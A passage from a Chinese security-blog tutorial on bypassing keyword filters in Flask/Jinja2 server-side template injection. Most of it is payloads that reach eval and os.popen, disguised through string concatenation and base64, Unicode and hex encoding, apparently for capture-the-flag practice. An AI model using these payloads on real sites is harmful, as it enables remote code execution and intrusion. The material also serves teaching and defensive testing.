<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>Python SSTI Bypass - 东隅 Blog</title><meta name="author" content="东隅">
<meta name="author-link" content="">
<meta name="description" content="" /><meta name="keywords" content='代码审计, python安全' />
  <meta itemprop="name" content="python SSTI bypass">
  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
  <meta itemprop="wordCount" content="1102">
  <meta itemprop="keywords" content="代码审计,Python安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/python/python%E5%AE%89%E5%85%A8/32/">
  <meta property="og:site_name" content="东隅 Blog">
  <meta property="og:title" content="python SSTI bypass">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
    <meta property="article:tag" content="代码审计">
    <meta property="article:tag" content="Python安全">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="python SSTI bypass">
<meta name="application-name" content="FixIt">
<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/python/python%E5%AE%89%E5%85%A8/32/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E8%AF%AD%E8%A8%80/python/98/" /><link rel="next" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/python/python%E5%AE%89%E5%85%A8/31/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "python SSTI bypass",
    "inLanguage": "en",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/python\/python%E5%AE%89%E5%85%A8\/32\/"
    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, python安全","wordcount":  1102 ,
    "url": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/python\/python%E5%AE%89%E5%85%A8\/32\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
      "@type": "Organization",
      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
        "@type": "Person",
        "name": "东隅"
      },"description": ""
  }
  </script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/posts/"
                  
                  
                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ></a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">Python SSTI Bypass</li>
    </ol>
  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Python SSTI Bypass</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="1102 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1200 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>6 minutes</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Contents</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#关键字绕过">关键字绕过</a>
      <ul>
        <li><a href="#拼接绕过">拼接绕过</a></li>
        <li><a href="#利用编码绕过">利用编码绕过</a></li>
        <li><a href="#利用引号绕过">利用引号绕过</a></li>
        <li><a href="#利用join函数绕过">利用join()函数绕过</a></li>
      </ul>
    </li>
    <li><a href="#绕过其他字符">绕过其他字符</a>
      <ul>
        <li><a href="#过滤了中括号-">过滤了中括号[ ]</a></li>
        <li><a href="#过滤了引号">过滤了引号</a></li>
        <li><a href="#过滤了下划线__">过滤了下划线__</a></li>
        <li><a href="#过滤了点-">过滤了点 .</a></li>
        <li><a href="#过滤了大括号-">过滤了大括号 <code>{{</code></a></li>
      </ul>
    </li>
    <li><a href="#组合bypass">组合Bypass</a>
      <ul>
        <li><a href="#同时过滤了--和-">同时过滤了 . 和 []</a></li>
        <li><a href="#同时过滤了-__-点-和-">同时过滤了 __ 、点. 和 []</a></li>
        <li><a href="#配合unicode编码绕过很多过滤">配合Unicode编码绕过很多过滤</a></li>
        <li><a href="#配合hex编码绕过很多过滤">配合Hex编码绕过很多过滤</a></li>
      </ul>
    </li>
    <li><a href="#使用-jinja-的过滤器进行bypass">使用 JinJa 的过滤器进行Bypass</a>
      <ul>
        <li><a href="#常用字符获取入口点">常用字符获取入口点</a></li>
        <li><a href="#2020-dasctf-八月安恒月赛ezflask">[2020 DASCTF 八月安恒月赛]ezflask</a></li>
      </ul>
    </li>
    <li><a href="#过滤了request和class">过滤了request和class</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h2 id="关键字绕过" class="heading-element"><span>关键字绕过</span>
  <a href="#%e5%85%b3%e9%94%ae%e5%ad%97%e7%bb%95%e8%bf%87" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 id="拼接绕过" class="heading-element"><span>拼接绕过</span>
  <a href="#%e6%8b%bc%e6%8e%a5%e7%bb%95%e8%bf%87" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>我们可以利用“+”进行字符串拼接，绕过关键字过滤</p>
<p>但是往往这种绕过需要一定的条件，返回的要是<strong>字典类型</strong>的或是<strong>字符串格式</strong>的，即payload中<strong>引号内</strong>的，在调用的时候才可以使用字符串拼接绕过，我们要学会怎么把被过滤的命令放在能拼接的地方。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span>[<span style="color:#a6be9d">0</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">40</span>](<span style="color:#a6be9d">&#39;/fl&#39;</span><span style="color:#ff636f">+</span><span style="color:#a6be9d">&#39;ag&#39;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">read</span>()}}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span>[<span style="color:#a6be9d">0</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">59</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span>[<span style="color:#a6be9d">&#39;__builtins__&#39;</span>][<span style="color:#a6be9d">&#39;eval&#39;</span>](<span style="color:#a6be9d">&#39;__import__(&#34;o&#34;+&#34;s&#34;).popen(&#34;ls /&#34;).read()&#39;</span>)}}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span>[<span style="color:#a6be9d">0</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">59</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span>[<span style="color:#a6be9d">&#39;__buil&#39;</span><span style="color:#ff636f">+</span><span style="color:#a6be9d">&#39;tins__&#39;</span>][<span style="color:#a6be9d">&#39;eval&#39;</span>](<span style="color:#a6be9d">&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;</span>)}}</span></span></code></pre></div><h3 id="利用编码绕过" class="heading-element"><span>利用编码绕过</span>
  <a href="#%e5%88%a9%e7%94%a8%e7%bc%96%e7%a0%81%e7%bb%95%e8%bf%87" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><h4 id="base64编码" class="heading-element"><span>base64编码</span>
  <a href="#base64%e7%bc%96%e7%a0%81" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>我们可以利用对关键字编码的方法，绕过关键字过滤，例如用base64编码绕过：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span>[<span style="color:#a6be9d">0</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">59</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span>[<span style="color:#a6be9d">&#39;X19idWlsdGluc19f&#39;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">decode</span>(<span style="color:#a6be9d">&#39;base64&#39;</span>)][<span style="color:#a6be9d">&#39;ZXZhbA==&#39;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">decode</span>(<span style="color:#a6be9d">&#39;base64&#39;</span>)](<span style="color:#a6be9d">&#39;X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ==&#39;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">decode</span>(<span style="color:#a6be9d">&#39;base64&#39;</span>))}}</span></span></code></pre></div><p>等同于：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span>[<span style="color:#a6be9d">0</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">59</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span>[<span style="color:#a6be9d">&#39;__builtins__&#39;</span>][<span style="color:#a6be9d">&#39;eval&#39;</span>](<span style="color:#a6be9d">&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;</span>)}}</span></span></code></pre></div><p>可以看到，在payload中，只要是字符串的，即payload中引号内的，都可以用编码绕过。同理还可以进行rot13等。这一切都是基于我们可以执行命令实现的。</p>
<h4 id="利用unicode编码绕过关键字flask适用" class="heading-element"><span>利用Unicode编码绕过关键字（flask适用）</span>
  <a href="#%e5%88%a9%e7%94%a8unicode%e7%bc%96%e7%a0%81%e7%bb%95%e8%bf%87%e5%85%b3%e9%94%ae%e5%ad%97flask%e9%80%82%e7%94%a8" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>我们可以利用unicode编码的方法，绕过关键字过滤，例如：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span>[<span style="color:#a6be9d">0</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">59</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span>[<span style="color:#a6be9d">&#39;</span><span style="color:#a6be9d">\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f</span><span style="color:#a6be9d">&#39;</span>][<span style="color:#a6be9d">&#39;</span><span style="color:#a6be9d">\u0065\u0076\u0061\u006c</span><span style="color:#a6be9d">&#39;</span>](<span style="color:#a6be9d">&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;</span>)}}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__base__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">77</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span>[<span style="color:#a6be9d">&#39;</span><span style="color:#a6be9d">\u006f\u0073</span><span style="color:#a6be9d">&#39;</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">popen</span>(<span style="color:#a6be9d">&#39;</span><span style="color:#a6be9d">\u006c\u0073\u0020\u002f</span><span style="color:#a6be9d">&#39;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">read</span>()}}</span></span></code></pre></div><p>等同于：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span>[<span style="color:#a6be9d">0</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">59</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span>[<span style="color:#a6be9d">&#39;__builtins__&#39;</span>][<span style="color:#a6be9d">&#39;eval&#39;</span>](<span style="color:#a6be9d">&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;</span>)}}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__base__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">77</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span>[<span style="color:#a6be9d">&#39;os&#39;</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">popen</span>(<span style="color:#a6be9d">&#39;ls /&#39;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">read</span>()}}</span></span></code></pre></div><p>可以看到，我们用eval时几乎所有命令都是再引号下的，我们这一手<strong>几乎</strong>可以通杀，几乎哈</p>
<h4 id="利用hex编码绕过关键字" class="heading-element"><span>利用Hex编码绕过关键字</span>
  <a href="#%e5%88%a9%e7%94%a8hex%e7%bc%96%e7%a0%81%e7%bb%95%e8%bf%87%e5%85%b3%e9%94%ae%e5%ad%97" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>和上面那个一样，只不过将Unicode编码换成了Hex编码，适用于过滤了“u”的情况。</p>
<p>我们可以利用hex编码的方法，绕过关键字过滤，例如：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span>[<span style="color:#a6be9d">0</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">59</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span>[<span style="color:#a6be9d">&#39;</span><span style="color:#a6be9d">\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f</span><span style="color:#a6be9d">&#39;</span>][<span style="color:#a6be9d">&#39;</span><span style="color:#a6be9d">\x65\x76\x61\x6c</span><span style="color:#a6be9d">&#39;</span>](<span style="color:#a6be9d">&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;</span>)}}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__base__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">77</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span>[<span style="color:#a6be9d">&#39;</span><span style="color:#a6be9d">\x6f\x73</span><span style="color:#a6be9d">&#39;</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">popen</span>(<span style="color:#a6be9d">&#39;</span><span style="color:#a6be9d">\x6c\x73\x20\x2f</span><span style="color:#a6be9d">&#39;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">read</span>()}}</span></span></code></pre></div><p>等同于</p>
